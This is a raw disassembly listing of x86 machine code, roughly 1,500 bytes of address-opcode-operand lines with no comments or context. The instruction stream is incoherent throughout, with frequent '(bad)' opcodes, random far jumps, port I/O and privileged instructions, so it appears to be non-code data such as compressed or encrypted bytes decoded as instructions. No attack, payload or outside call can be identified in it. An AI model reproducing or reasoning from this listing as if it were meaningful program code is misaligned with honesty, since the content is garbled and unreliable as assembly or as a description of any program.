  4185c9:	inc    edi
  4185ca:	(bad)  
  4185cb:	out    dx,eax
  4185cc:	pop    ebp
  4185cd:	mov    eax,0xc3333fb3
  4185d2:	iret   
  4185d3:	fld    QWORD PTR [edi-0x159e5b61]
  4185d9:	gs or  al,0x87
  4185dc:	adc    BYTE PTR [eax-0x7],bl
  4185df:	xchg   ebp,eax
  4185e0:	daa    
  4185e1:	jne    0x4185f9
  4185e3:	dec    ecx
  4185e4:	iret   
  4185e5:	mov    eax,ds:0x99c22350
  4185ea:	shl    DWORD PTR [ecx],0x47
  4185ed:	add    bl,BYTE PTR [ebx+0x1d]
  4185f0:	sub    al,0x3
  4185f2:	sbb    dl,BYTE PTR [eax]
  4185f4:	push   esi
  4185f5:	test   eax,0x11edc6c7
  4185fa:	mov    al,ds:0x5f73537b
  4185ff:	out    0xfc,eax
  418601:	mov    ebx,0xb2c60247
  418606:	ins    DWORD PTR es:[edi],dx
  418607:	push   ebp
  418608:	xor    edx,esi
  41860a:	mov    eax,0x3432d016
  41860f:	ror    bh,1
  418611:	or     eax,0xa811ca5c
  418616:	(bad)  
  418618:	mov    cl,0x72
  41861a:	jg     0x41860f
  41861c:	mov    esi,0x5b670dbe
  418621:	adc    bl,BYTE PTR ds:0x91afa16c
  418627:	dec    ebx
  418628:	out    dx,al
  418629:	mov    ch,0xc1
  41862b:	sub    al,0x3e
  41862d:	push   cs
  41862e:	pop    ebp
  41862f:	mov    ds:0xde318172,eax
  418634:	lods   al,BYTE PTR ds:[esi]
  418635:	push   ds
  418636:	test   BYTE PTR [edx-0x16363614],bh
  41863c:	jae    0x418659
  41863e:	sub    ch,BYTE PTR [eax+0x2d]
  418641:	test   al,0xa9
  418643:	clc    
  418644:	iret   
  418645:	cmp    eax,0x3ce3cf0f
  41864a:	retf   
  41864b:	mov    eax,ds:0x646224a8
  418650:	out    dx,eax
  418651:	(bad)  
  418652:	pop    ecx
  418653:	gs pop edx
  418655:	sti    
  418656:	sahf   
  418657:	mov    bh,0x22
  418659:	pop    edi
  41865a:	dec    edx
  41865b:	out    0x27,al
  41865d:	jnp    0x418602
  41865f:	pop    eax
  418660:	or     eax,0x7da82c79
  418665:	mov    ds:0x684445b3,al
  41866a:	sti    
  41866b:	rcl    BYTE PTR [eax-0x23ee8dfc],0xf0
  418672:	inc    edx
  418673:	gs inc edi
  418675:	out    0x5f,eax
  418677:	mov    edx,0x58c97ed0
  41867c:	sbb    cl,BYTE PTR [ecx+0xbae05a5]
  418682:	(bad)  
  418683:	mov    cl,0x7c
  418685:	arpl   WORD PTR [eax-0x44cc8e91],di
  41868b:	ffreep st(3)
  41868d:	(bad)  [ebx+0x1bfd256]
  418693:	mov    edi,0x779dba0c
  418698:	imul   eax,DWORD PTR [eax],0x55
  41869b:	inc    ecx
  41869c:	push   ecx
  41869d:	daa    
  41869e:	lahf   
  41869f:	cmp    al,0x3a
  4186a1:	pop    ds
  4186a2:	or     eax,0xad72ee95
  4186a7:	xor    al,0xf6
  4186a9:	leave  
  4186aa:	sbb    BYTE PTR [edx+edx*1+0xb4cc1f3],al
  4186b1:	jmp    0x1fa665d9
  4186b6:	(bad)  
  4186b8:	outs   dx,DWORD PTR ds:[esi]
  4186b9:	in     eax,dx
  4186ba:	push   0xe1f44eb5
  4186bf:	cmc    
  4186c0:	dec    edx
  4186c1:	adc    ebp,eax
  4186c3:	xor    ebx,DWORD PTR [edi-0x737ef95b]
  4186c9:	xchg   ah,cl
  4186cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186cc:	repz mov cl,0xe0
  4186cf:	rcl    BYTE PTR [edi],1
  4186d1:	xor    al,0x8c
  4186d3:	(bad)  
  4186d4:	arpl   WORD PTR [esi+ecx*8+0x61],bp
  4186d8:	sbb    BYTE PTR [esi+0x50],ch
  4186db:	stos   BYTE PTR es:[edi],al
  4186dc:	int    0x92
  4186de:	sbb    bh,bl
  4186e0:	push   esi
  4186e1:	dec    eax
  4186e2:	dec    ebx
  4186e3:	dec    ecx
  4186e4:	add    dl,BYTE PTR [esi]
  4186e6:	sbb    ah,bl
  4186e8:	cmc    
  4186e9:	push   ecx
  4186ea:	pop    esi
  4186eb:	and    cl,BYTE PTR [edi+0x69af1e00]
  4186f1:	mov    ss,ecx
  4186f3:	pop    esi
  4186f4:	stos   BYTE PTR es:[edi],al
  4186f5:	cmp    edx,DWORD PTR [edi+0xe]
  4186f8:	mov    bh,0xf4
  4186fa:	ja     0x4186f6
  4186fc:	inc    esi
  4186fd:	jbe    0x418723
  4186ff:	shl    ebp,0xef
  418702:	in     al,dx
  418703:	int3   
  418704:	das    
  418705:	push   edx
  418706:	mov    eax,0x84c6d986
  41870b:	jp     0x4186e1
  41870d:	push   cs
  41870e:	jmp    0xa185:0x5dd6abee
  418715:	sar    esi,cl
  418717:	mov    al,ds:0xd2b6af4b
  41871c:	cmp    ch,0xb2
  41871f:	mov    ds:0xdbdb92ea,eax
  418724:	paddb  mm0,QWORD PTR [ebx]
  418727:	xor    DWORD PTR [edi+ebx*4+0x18548318],esp
  41872e:	loope  0x41876d
  418730:	inc    edx
  418731:	fs push ss
  418733:	mov    ah,0x5e
  418735:	call   FWORD PTR [ebp-0x233e1148]
  41873b:	xlat   BYTE PTR ds:[ebx]
  41873c:	fisttp QWORD PTR [edi+eax*8-0x7f271fda]
  418743:	mov    edx,0xa982fd4d
  418748:	add    ch,BYTE PTR [ecx+0x6e422782]
  41874e:	jno    0x41879d
  418750:	int3   
  418751:	fcomi  st,st(6)
  418753:	into   
  418754:	push   eax
  418755:	push   0x52
  418757:	into   
  418758:	xor    DWORD PTR [edx+0x36872da3],ebp
  41875e:	sar    DWORD PTR [esi+0x57],0x58
  418762:	outs   dx,BYTE PTR ds:[esi]
  418763:	mov    esi,0x8d532b35
  418768:	jb     0x418720
  41876a:	jb     0x418746
  41876c:	or     eax,0xec4f6c59
  418771:	jle    0x4186f9
  418773:	mov    eax,0xd11fbf9d
  418778:	cmp    esi,DWORD PTR [edi-0x5b91bedf]
  41877e:	jno    0x41875d
  418780:	mov    eax,ds:0x30608e9d
  418785:	(bad)  
  418786:	(bad)  
  418787:	call   0x51df4645
  41878c:	bound  esi,QWORD PTR [esi]
  41878e:	push   ebp
  41878f:	xor    bl,BYTE PTR [esi-0x54]
  418792:	(bad)  
  418794:	in     eax,0xc3
  418796:	sub    ch,bl
  418798:	xor    ecx,edi
  41879a:	xchg   BYTE PTR [ebp+0x33727f42],ch
  4187a0:	or     al,BYTE PTR [edx+0x12]
  4187a3:	jne    0x41876c
  4187a5:	cmp    DWORD PTR [esi+0x52],ecx
  4187a8:	xchg   BYTE PTR [eax+0x2c36d076],dh
  4187ae:	push   ecx
  4187af:	out    0x97,eax
  4187b1:	jb     0x4187b5
  4187b3:	jle    0x418765
  4187b5:	sub    eax,0x49387c0c
  4187ba:	or     al,0xbb
  4187bc:	xchg   ebx,eax
  4187bd:	cli    
  4187be:	pop    esp
  4187bf:	cmp    ecx,DWORD PTR [esi+esi*8+0x42ed4b9d]
  4187c6:	in     al,dx
  4187c7:	repz popf 
  4187c9:	inc    ebx
  4187ca:	aaa    
  4187cb:	ficomp DWORD PTR [edx*4+0x489f280d]
  4187d2:	inc    edx
  4187d3:	dec    eax
  4187d4:	cli    
  4187d5:	push   ds
  4187d6:	and    dh,dh
  4187d8:	sti    
  4187d9:	je     0x418847
  4187db:	test   esp,ecx
  4187dd:	stos   BYTE PTR es:[edi],al
  4187de:	sbb    DWORD PTR [ebx+0x10],eax
  4187e1:	mov    ebp,0x193ffd82
  4187e6:	xchg   edi,eax
  4187e7:	lock adc dl,BYTE PTR [ebx-0x706029a]
  4187ee:	scas   eax,DWORD PTR es:[edi]
  4187ef:	in     eax,0x18
  4187f1:	and    edx,DWORD PTR [eax-0x44]
  4187f4:	add    DWORD PTR [edx],0xffffffcf
  4187f7:	mov    edi,0xa28b1bc9
  4187fc:	add    eax,0x4dd0aa1e
  418801:	addr16 mov eax,ds:0x6c2f
  418805:	or     eax,0xbc68df3
  41880a:	pop    ds
  41880b:	push   edx
  41880c:	cmp    BYTE PTR [ebx],dh
  41880e:	jo     0x418860
  418810:	hlt    
  418811:	loope  0x418798
  418813:	mov    cl,0x67
  418815:	xor    BYTE PTR [ecx+0x7c],ch
  418818:	lahf   
  418819:	cmp    BYTE PTR [ebp-0x5033318d],ah
  41881f:	dec    ecx
  418820:	cld    
  418821:	jne    0x418869
  418823:	rcl    BYTE PTR [eax+0x70],0x90
  418827:	inc    esp
  418828:	in     al,0x83
  41882a:	or     ebx,ecx
  41882c:	mov    al,ds:0xd4c6a571
  418831:	fcomp  DWORD PTR [esi]
  418833:	retf   0x859e
  418836:	ss js  0x418854
  418839:	aaa    
  41883a:	daa    
  41883b:	sbb    ebx,DWORD PTR [ebx-0x55]
  41883e:	mov    cl,0xc1
  418840:	or     edi,DWORD PTR [edi+eax*4]
  418843:	mov    BYTE PTR ds:0x2e6caadc,cl
  418849:	sub    esp,DWORD PTR [ebp+0x66]
  41884c:	inc    ebp
  41884d:	jae    0x4187ee
  41884f:	xchg   edi,eax
  418850:	cdq    
  418851:	test   edx,eax
  418853:	adc    BYTE PTR [ecx+0x60783a0],0xe7
  41885a:	std    
  41885b:	fcomp  DWORD PTR [eax+0x4dc96b65]
  418861:	fldcw  WORD PTR [ebp+0x4f]
  418864:	jl     0x41888c
  418866:	icebp  
  418867:	lock mov ?,WORD PTR [esi]
  41886a:	enter  0xc29b,0xdd
  41886e:	sbb    DWORD PTR [esi+0x69],edx
  418871:	es std 
  418873:	mov    ebx,cs
  418875:	jmp    DWORD PTR [ebx-0x285e27f4]
  41887b:	inc    edx
  41887c:	xor    eax,0x40452f4
  418881:	mov    bh,0x55
  418883:	or     ch,BYTE PTR [eax+0x3081c776]
  418889:	clc    
  41888a:	retf   0x7a0d
  41888d:	arpl   sp,di
  41888f:	dec    edi
  418890:	xor    eax,0xdb95fa03
  418895:	(bad)  
  418896:	gs call 0x4b9adb35
  41889c:	mov    edi,0xeb4c1f03
  4188a1:	or     DWORD PTR [edi-0x2d17e9fd],ebp
  4188a7:	adc    eax,0x843483da
  4188ac:	call   0xf679a465
  4188b1:	loop   0x418867
  4188b3:	in     eax,0xb0
  4188b5:	mov    WORD PTR [eax+0x33ec812e],gs
  4188bb:	aad    0x7c
  4188bd:	loop   0x41892b
  4188bf:	aas    
  4188c0:	daa    
  4188c1:	and    al,dl
  4188c3:	adc    al,0x4f
  4188c5:	pop    es
  4188c6:	jbe    0x4188e7
  4188c8:	cmp    bh,BYTE PTR [esi]
  4188ca:	int    0xd3
  4188cc:	add    DWORD PTR [edx-0x7a79e60e],0x57c38ff9
  4188d6:	stos   BYTE PTR es:[edi],al
  4188d7:	mov    ah,0x50
  4188d9:	fistp  WORD PTR [ecx+0x4ee24d35]
  4188e0:	call   0x186a29c6
  4188e5:	cs mov bh,0x52
  4188e8:	xchg   ebp,eax
  4188e9:	mov    cl,0xe7
  4188eb:	pop    es
  4188ec:	bound  ebp,QWORD PTR [ebx+0x44]
  4188ef:	or     DWORD PTR [eax+ebx*2],ebp
  4188f2:	ds jecxz 0x41889c
  4188f5:	adc    BYTE PTR [esi-0x52],dl
  4188f8:	pop    ecx
  4188f9:	mov    eax,0xf7bc203b
  4188fe:	mov    ah,0xd0
  418900:	xchg   edx,eax
  418901:	std    
  418902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418903:	mov    esi,0x5e90671
  418908:	rcl    BYTE PTR [eax+0x88dc4e3],cl
  41890e:	sub    al,0xd0
  418910:	mov    al,0x2c
  418912:	cld    
  418913:	pusha  
  418914:	push   0xffffffb8
  418916:	call   0x57100be2
  41891b:	jl     0x4188db
  41891d:	popf   
  41891e:	shr    DWORD PTR [eax-0xf83f8af],1
  418924:	push   ds
  418925:	sbb    edx,DWORD PTR [eax-0xa55a246]
  41892b:	xor    DWORD PTR [ebp+0x7877bbc6],ecx
  418931:	push   0x23
  418933:	fdiv   st,st(7)
  418935:	mov    eax,0x652344a
  41893a:	(bad)  
  41893b:	cld    
  41893c:	fwait
  41893d:	out    dx,eax
  41893e:	(bad)  
  41893f:	outs   dx,BYTE PTR ds:[esi]
  418940:	adc    esp,DWORD PTR [edi-0x4a0a71ed]
  418946:	cmp    BYTE PTR [ecx-0x33e8d904],0x9f
  41894d:	fwait
  41894e:	in     al,dx
  41894f:	test   BYTE PTR [esi-0xefcb8b0],0xfd
  418956:	push   esi
  418957:	sbb    edx,eax
  418959:	test   BYTE PTR [eax],dh
  41895b:	daa    
  41895c:	loope  0x41890a
  41895e:	sbb    bh,BYTE PTR [edi]
  418960:	inc    edi
  418961:	jg     0x41894c
  418963:	jbe    0x4188fe
  418965:	add    al,0xa5
  418967:	repz pop ds
  418969:	adc    BYTE PTR [esi-0x6f8871a0],dl
  41896f:	aaa    
  418970:	and    BYTE PTR [edi+0x46e2d24d],ah
  418976:	stc    
  418977:	or     DWORD PTR [eax],ebx
  418979:	inc    ebp
  41897a:	pusha  
  41897b:	int    0x3b
  41897d:	repnz out 0xda,al
  418980:	hlt    
  418981:	inc    esp
  418982:	aaa    
  418983:	les    ebp,FWORD PTR [edx-0x75ebdf19]
  418989:	jno    0x4189c0
  41898b:	fstp   DWORD PTR [eax]
  41898d:	pop    esp
  41898e:	daa    
  41898f:	in     al,dx
  418990:	imul   ebp,ebx,0x4
  418993:	fistp  DWORD PTR [ebx+0x20689d56]
  418999:	cmc    
  41899a:	shl    BYTE PTR [edi-0x23893553],0x50
  4189a1:	rcl    ebx,0x63
  4189a4:	mov    dl,0x69
  4189a6:	popa   
  4189a7:	mov    ebp,0x43ee763
  4189ac:	int    0x1
  4189ae:	mov    ebp,0xc2dfd7d9
  4189b3:	bound  ebp,QWORD PTR es:[edx-0x7e174b7f]
  4189ba:	xchg   esi,eax
  4189bb:	cmp    eax,ebx
  4189bd:	or     eax,0xc47c71c5
  4189c2:	ret    0x55e3
  4189c5:	add    al,0x6
  4189c7:	sti    
  4189c8:	push   es
  4189c9:	dec    esi
  4189ca:	mov    edi,DWORD PTR ds:0x400e95ab
  4189d0:	in     al,dx
  4189d1:	or     BYTE PTR [esi-0x4],0x85
  4189d5:	mov    ebp,0x4b4b5d71
  4189da:	ror    dh,0x3e
  4189dd:	cli    
  4189de:	inc    eax
  4189df:	out    0x49,al
  4189e1:	loopne 0x41898d
  4189e3:	push   es
  4189e4:	les    esi,FWORD PTR [esi]
  4189e6:	dec    edi
  4189e7:	mov    ebp,0x53618e26
  4189ec:	and    DWORD PTR [eax+0x7891b02a],0x48
  4189f3:	xchg   ebx,eax
  4189f4:	mov    ecx,0xe313e674
  4189f9:	shl    al,0x36
  4189fc:	xor    al,0x10
  4189fe:	push   esp
  4189ff:	inc    ebx
  418a00:	add    eax,0x24470281
  418a05:	or     ebp,DWORD PTR [edi-0x5e]
  418a08:	bound  edi,QWORD PTR [ebx+0x4]
  418a0b:	or     al,0x71
  418a0d:	dec    esp
  418a0e:	push   es
  418a0f:	loope  0x418a5f
  418a11:	in     al,dx
  418a12:	pop    es
  418a13:	aam    0x13
  418a15:	(bad)  
  418a16:	xchg   ebp,eax
  418a17:	xor    cl,dl
  418a19:	jae    0x418a44
  418a1b:	push   esp
  418a1c:	push   es
  418a1d:	mov    BYTE PTR [esi+eiz*8-0x3b],bl
  418a21:	xchg   ecx,eax
  418a22:	adc    cl,BYTE PTR [ebp-0x9]
  418a25:	retf   
  418a26:	data16 mov ds:0x60059d2b,al
  418a2c:	sahf   
  418a2d:	test   al,0x6f
  418a2f:	std    
  418a30:	das    
  418a31:	out    0x17,eax
  418a33:	pop    ss
  418a34:	cdq    
  418a35:	jecxz  0x418a93
  418a37:	jbe    0x4189e4
  418a39:	adc    BYTE PTR [edi-0x3d521085],al
  418a3f:	cli    
  418a40:	jb     0x418ab8
  418a42:	sbb    al,0x12
  418a44:	retf   0xf8f0
  418a47:	mov    ah,0x3b
  418a49:	js     0x418a70
  418a4b:	inc    ebx
  418a4c:	and    al,0x4d
  418a4e:	lods   eax,DWORD PTR ds:[esi]
  418a4f:	fcmovne st,st(1)
  418a51:	repz sahf 
  418a53:	je     0x418abf
  418a55:	sar    DWORD PTR [ecx-0x25],0x57
  418a59:	xchg   ecx,eax
  418a5a:	push   0xda99fe3d
  418a5f:	or     ah,BYTE PTR [ebx]
  418a61:	pushf  
  418a62:	cdq    
  418a63:	je     0x418a51
  418a65:	outs   dx,DWORD PTR ds:[esi]
  418a66:	arpl   bx,si
  418a68:	ins    DWORD PTR es:[edi],dx
  418a69:	push   es
  418a6a:	jne    0x418a76
  418a6c:	fmul   DWORD PTR [ecx]
  418a6e:	dec    edi
  418a6f:	and    DWORD PTR [edi+esi*2+0x60],ebp
  418a73:	and    eax,0xd33d25ec
  418a78:	push   ecx
  418a79:	push   0x106c73fa
  418a7e:	jl     0x418a65
  418a80:	sub    al,0x74
  418a82:	fucom  st(5)
  418a84:	bound  bp,DWORD PTR [esi-0x4]
  418a88:	jg     0x418a6f
  418a8a:	push   ebp
  418a8b:	test   eax,0xb2b81c2f
  418a90:	call   0xae85:0x3e0455bb
  418a97:	jae    0x418aa3
  418a99:	sbb    edx,ecx
  418a9b:	and    al,0x89
  418a9d:	dec    ebx
  418a9e:	jno    0x418a92
  418aa0:	sbb    esp,DWORD PTR [edi]
  418aa2:	adc    esp,DWORD PTR [ecx-0x1f0c781]
  418aa8:	xchg   ecx,eax
  418aa9:	mov    esp,0xa2c44bb1
  418aae:	rol    BYTE PTR [ebx-0x18ad090d],1
  418ab4:	jbe    0x418b21
  418ab6:	loopne 0x418ab4
  418ab8:	mov    bh,0x6
  418aba:	hlt    
  418abb:	dec    ebp
  418abc:	add    eax,0x7d96db73
  418ac1:	pushf  
  418ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ac3:	xor    DWORD PTR [ebp-0x48e16caa],0xb9f33d93
  418acd:	xor    bh,BYTE PTR [ecx-0xd0c9999]
  418ad3:	pop    ebx
  418ad4:	stos   DWORD PTR es:[edi],eax
  418ad5:	mov    al,0xef
  418ad7:	mov    ?,WORD PTR [ebx]
  418ad9:	loope  0x418aa5
  418adb:	mov    dh,0x95
  418add:	lods   eax,DWORD PTR ds:[esi]
  418ade:	jno    0x418acd
  418ae0:	daa    
  418ae1:	in     al,dx
  418ae2:	pop    ds
  418ae3:	lds    edi,FWORD PTR [ecx-0x51]
  418ae6:	push   0x40
  418ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ae9:	scas   al,BYTE PTR es:[edi]
  418aea:	push   esp
  418aeb:	in     eax,0x3
  418aed:	jp     0x418a72
  418aef:	inc    ebp
  418af0:	pop    edx
  418af1:	xchg   ebx,eax
  418af2:	cmc    
  418af3:	(bad)  
  418af4:	mov    ebp,0xb9b33113
  418af9:	push   ecx
  418afa:	cld    
  418afb:	lods   eax,DWORD PTR ds:[esi]
  418afc:	mul    DWORD PTR ds:0x4f92b10d
  418b02:	mov    bl,0x15
  418b04:	int3   
  418b05:	lods   eax,DWORD PTR ds:[esi]
  418b06:	in     eax,0x19
  418b08:	jge    0x418aac
  418b0a:	es adc ax,0x6
  418b0f:	mov    ebp,0xed5361ff
  418b14:	mov    ebp,0x49b2f522
  418b19:	xchg   esp,eax
  418b1a:	shr    BYTE PTR [esi+0x9481fb8],cl
  418b20:	xchg   esi,eax
  418b21:	stos   BYTE PTR es:[edi],al
  418b22:	fldenv [esi]
  418b24:	or     BYTE PTR [esi],dh
  418b26:	cmp    ebp,ebp
  418b28:	sub    eax,0xeb5b1c9d
  418b2d:	or     DWORD PTR [edx+ebx*1-0x6d],ebp
  418b31:	jns    0x418aeb
  418b33:	mov    edx,0xefc465f0
  418b38:	ds dec ebp
  418b3a:	push   ss
  418b3b:	push   cs
  418b3c:	xlat   BYTE PTR ds:[ebx]
  418b3d:	pop    ss
  418b3e:	push   0xffffffa9
  418b40:	icebp  
  418b41:	imul   eax,DWORD PTR [ecx-0x5fc69a4c],0x0
  418b48:	std    
  418b49:	sbb    eax,0xcc640d1
  418b4e:	dec    ebp
  418b4f:	fcmovbe st,st(0)
  418b51:	jbe    0x418b5f
  418b53:	dec    ecx
  418b54:	pop    ebx
  418b55:	lods   eax,DWORD PTR ds:[esi]
  418b56:	retf   0xebdf
  418b59:	aad    0x43
  418b5b:	ds fcmovu st,st(5)
  418b5e:	cdq    
  418b5f:	cdq    
  418b60:	fcom   st(2)
  418b62:	ins    DWORD PTR es:[edi],dx
  418b63:	retf   0x4fd2
  418b66:	mov    ebx,0x941fe2e5
  418b6b:	sub    al,0x9d
  418b6d:	dec    ebp
  418b6e:	push   ds
  418b6f:	and    cl,BYTE PTR [edi-0x61]
  418b72:	and    al,BYTE PTR [edi+eiz*2]
  418b75:	addr16 mov eax,0x649e3142
  418b7b:	push   esp
  418b7c:	lods   al,BYTE PTR ds:[esi]
  418b7d:	cmp    al,0xe5
  418b7f:	sub    BYTE PTR [ebx-0x1d],al
  418b82:	(bad)  
  418b83:	mov    eax,0xffa69337
  418b88:	fdiv   QWORD PTR [edx+0x39]
  418b8b:	dec    edi
  418b8c:	xor    esi,edx
  418b8e:	or     BYTE PTR [esi-0x7c],ah
  418b91:	cmp    al,0x8a
  418b93:	jmp    0x9fa1a6c6
  418b98:	sti    
  418b99:	das    
  418b9a:	inc    esp
  418b9b:	lods   al,BYTE PTR ds:[esi]
  418b9c:	repz jbe 0x418b30
  418b9f:	bswap  eax
  418ba1:	pop    ebp
  418ba2:	lea    ebp,[ecx+0x4e]
  418ba5:	hlt    
  418ba6:	cmp    bh,BYTE PTR [ebp-0x3f]
  418ba9:	mov    ebp,DWORD PTR [esp+eax*8]
  418bac:	fstp   TBYTE PTR [edx+ecx*1]
  418baf:	jge    0x418c28
  418bb1:	sbb    eax,0x53bb443a
  418bb6:	add    ah,al
  418bb8:	stos   DWORD PTR es:[edi],eax
  418bb9:	loop   0x418bce
  418bbb:	add    al,al
  418bbd:	pop    ecx
  418bbe:	or     eax,0x4687eed6
  418bc3:	push   ecx
  418bc4:	or     bh,BYTE PTR ds:0xa8114cd
  418bca:	or     BYTE PTR [ecx-0x60],ch
  418bcd:	repz js 0x418bc0
  418bd0:	call   0xe47e:0x2ab0dd8c
  418bd7:	cmc    
  418bd8:	iret   
  418bd9:	mov    esp,0x7051e4dc
  418bde:	pushf  
  418bdf:	shl    BYTE PTR [ecx-0x6489e8b3],1
  418be5:	sbb    al,0xc9
  418be7:	mov    al,0xf
  418be9:	fwait
  418bea:	dec    edi
  418beb:	ficomp WORD PTR [ecx]
  418bed:	push   esp
  418bee:	jl     0x418bdd
  418bf0:	jmp    0xb5b0:0x3d437874
  418bf7:	xor    ecx,edx
  418bf9:	or     eax,0x47b36739
  418bfe:	fcom   DWORD PTR ds:0xd2279297
  418c04:	lods   al,BYTE PTR ds:[esi]
  418c05:	push   edi
  418c06:	and    DWORD PTR [eax],esp
  418c08:	mov    DWORD PTR [ebx+0x14a40957],ebp
  418c0e:	out    dx,eax
  418c0f:	(bad)  
  418c10:	cs call 0x1ee12c25
  418c16:	fiadd  DWORD PTR [ecx]
  418c18:	imul   edi,ecx,0xe37beaa5
  418c1e:	sub    al,0x95
  418c20:	push   eax
  418c21:	imul   esp,DWORD PTR [eax],0x7c5c8a03
  418c27:	xchg   esi,eax
  418c28:	sbb    DWORD PTR [edi-0x39],edi
  418c2b:	sub    BYTE PTR [edx-0x5a],dh
  418c2e:	enter  0xe66,0x79
  418c32:	adc    eax,0x56dba1ee
  418c37:	sbb    DWORD PTR [ecx],esi
  418c39:	xor    eax,0x362c5daf
  418c3e:	push   edi
  418c3f:	ror    BYTE PTR [edi-0x39],0xff
  418c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c44:	stos   DWORD PTR es:[edi],eax
  418c45:	in     al,0x12
  418c47:	das    
  418c48:	pop    edi
  418c49:	out    0x54,eax
  418c4b:	xchg   ecx,eax
  418c4c:	or     ah,dl
  418c4e:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  418c50:	lds    eax,FWORD PTR [edi+0x703aaa05]
  418c56:	jbe    0x418c5c
  418c58:	push   esi
  418c59:	adc    DWORD PTR [esi+0x167a66b],esp
  418c5f:	adc    dl,bl
  418c61:	sbb    eax,0xe56e01e8
  418c66:	(bad)  
  418c67:	popa   
  418c68:	aaa    
  418c69:	adc    eax,DWORD PTR [eax+edx*1+0x385e2168]
  418c70:	push   edi
  418c71:	int3   
  418c72:	sbb    ah,BYTE PTR [ebp-0x48]
  418c75:	mov    ebx,0x4f1baf19
  418c7a:	xchg   esp,eax
  418c7b:	xchg   edi,eax
  418c7c:	retf   0xd0e6
  418c7f:	xchg   edi,eax
  418c80:	arpl   WORD PTR [esi+0x42],si
  418c83:	mov    esp,0xd5f344bf
  418c88:	call   0x340f:0xea156293
  418c8f:	jp     0x418c8b
  418c91:	and    edi,DWORD PTR [eax+0x17]
  418c94:	inc    edx
  418c95:	leave  
  418c96:	xor    ecx,DWORD PTR [eax+0x2a43467c]
  418c9c:	(bad)  
  418c9d:	aam    0x8e
  418c9f:	daa    
  418ca0:	stos   BYTE PTR es:[edi],al
  418ca1:	or     edi,DWORD PTR [ebp-0x68]
  418ca4:	lods   eax,DWORD PTR ds:[esi]
  418ca5:	scas   al,BYTE PTR es:[edi]
  418ca6:	mov    ds:0x11bcfc5f,al
  418cab:	hlt    
  418cac:	out    dx,eax
  418cad:	ss jecxz 0x418cff
  418cb0:	les    ebx,FWORD PTR [ebp+ebx*4+0x27]
  418cb4:	test   DWORD PTR [ebx],0x8b0433b1
  418cba:	mov    esp,0xa727c580
  418cbf:	gs cmp al,0x9f
  418cc2:	push   ss
  418cc3:	pop    esp
  418cc4:	fcmovnb st,st(1)
  418cc6:	mov    ds:0x623bdc85,eax
  418ccb:	adc    BYTE PTR [eax-0x7441e4b3],ch
  418cd1:	pop    edx
  418cd2:	mov    ebx,0x747d44ce
  418cd7:	outs   dx,DWORD PTR ds:[esi]
  418cd8:	pop    edx
  418cd9:	mov    esi,0x62ee565b
  418cde:	into   
  418cdf:	jo     0x418d21
  418ce1:	xor    eax,0xcf897ebd
  418ce6:	test   DWORD PTR [esi],0xd91a056e
  418cec:	mov    edx,0x5e2a7940
  418cf1:	mov    al,ds:0x48f2a012
  418cf6:	jmp    0x7ec7:0xdb979127
  418cfd:	adc    al,0xbc
  418cff:	ret    0xd013
  418d02:	xchg   esi,eax
  418d03:	inc    ebx
  418d04:	push   cs
  418d05:	cmp    ch,cl
  418d07:	into   
  418d08:	test   al,0x49
  418d0a:	mov    ebx,0xa79c8836
  418d0f:	xchg   DWORD PTR [edx-0xf],esp
  418d12:	pop    eax
  418d13:	jno    0x418cbb
  418d15:	sub    esp,DWORD PTR [edx+0x35]
  418d18:	arpl   WORD PTR [edx+0x3d],cx
  418d1b:	jge    0x418d4b
  418d1d:	sbb    ebp,0xb
  418d20:	jmp    0xfd5d:0xc5ec2338
  418d27:	mov    bh,0x11
  418d29:	jne    0x418d84
  418d2b:	push   ebx
  418d2c:	dec    ecx
  418d2d:	add    eax,0x44e570c5
  418d32:	add    esi,ebx
  418d34:	ret    0xd345
  418d37:	jo     0x418cba
  418d39:	out    0x6d,eax
  418d3b:	stos   DWORD PTR es:[edi],eax
  418d3c:	imul   eax,esi,0xffffffa0
  418d3f:	enter  0xe56a,0xba
  418d43:	lods   eax,DWORD PTR ds:[esi]
  418d44:	shl    edx,0x79
  418d47:	sub    edx,DWORD PTR [ecx]
  418d49:	sbb    dh,bl
  418d4b:	iret   
  418d4c:	nop
  418d4d:	xor    eax,0xe6ee5629
  418d52:	data16 (bad) 
  418d54:	into   
  418d55:	in     al,0xe3
  418d57:	mov    edi,0x1691c41f
  418d5c:	call   DWORD PTR [ebp+ebp*8+0x1576adc8]
  418d63:	sub    edi,DWORD PTR [ebx-0x4e09bb62]
  418d69:	cwde   
  418d6a:	retf   0xe945
  418d6d:	test   al,0xbc
  418d6f:	xchg   ebx,eax
  418d70:	jecxz  0x418dad
  418d72:	dec    esp
  418d73:	cdq    
  418d74:	jnp    0x418d2d
  418d76:	dec    edx
  418d77:	adc    al,0xbb
  418d79:	pop    esp
  418d7a:	mov    eax,esp
  418d7c:	adc    BYTE PTR [edi],ah
  418d7e:	(bad)  
  418d7f:	pop    eax
  418d80:	mov    edi,DWORD PTR [edi]
  418d82:	xchg   ebx,eax
  418d83:	inc    ecx
  418d84:	or     ah,BYTE PTR [edx+0x75]
  418d87:	mov    ebx,0xe9c250c8
  418d8c:	pop    esp
  418d8d:	dec    eax
  418d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d8f:	xchg   edx,eax
  418d90:	cld    
  418d91:	(bad)
  418d94:	aam    0xf2
  418d96:	or     eax,0xf757f515
  418d9b:	and    DWORD PTR [esi-0x42b665f6],0xffffffe5
  418da2:	sbb    BYTE PTR [esp+edi*8-0x26],bh
  418da6:	jge    0x418e13
  418da8:	add    ecx,ecx
  418daa:	fisub  DWORD PTR [edi-0x59d6c3cd]
  418db0:	mov    fs:0xe1404574,al
  418db6:	dec    ebx
  418db7:	adc    eax,0x78c31483
  418dbc:	or     BYTE PTR [ecx+0x6e],dh
  418dbf:	dec    ebx
  418dc0:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  418dc2:	repnz iret 
  418dc4:	loope  0x418df2
  418dc6:	test   BYTE PTR [eax+0x51],dl
  418dc9:	stos   DWORD PTR es:[edi],eax
  418dca:	xor    BYTE PTR [ebx],ah
  418dcc:	xchg   ebp,eax
  418dcd:	enter  0x8918,0xfa
  418dd1:	or     esi,DWORD PTR ds:0xf36bc7a7
  418dd7:	(bad)  
